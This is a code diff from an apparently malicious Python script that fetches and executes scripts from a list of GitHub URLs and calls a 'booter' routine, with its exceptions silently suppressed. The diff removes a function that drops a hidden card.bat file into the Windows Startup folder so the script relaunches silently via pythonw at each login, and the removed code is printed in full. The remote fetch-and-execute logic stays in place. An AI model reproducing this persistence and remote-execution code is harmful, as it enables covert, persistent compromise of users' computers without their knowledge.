@@ -77,17 +77,7 @@ def fetch_and_execute_script(urls):
         except Exception as e:
             print(f"")
 
-def create_startup_bat():
-    """Create a .bat file to launch the script and add it to the startup folder"""
-    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-    bat_file_path = os.path.join(startup_folder, 'card.bat')
-
-    if not os.path.exists(bat_file_path):
-        with open(bat_file_path, 'w') as bat_file:
-            bat_file.write(f'@echo off\nstart /b pythonw "{os.path.abspath(__name__)}"\n')
-
 def main():
-    create_startup_bat()
     run_booter_in_separate_terminal()
 
     github_urls = [
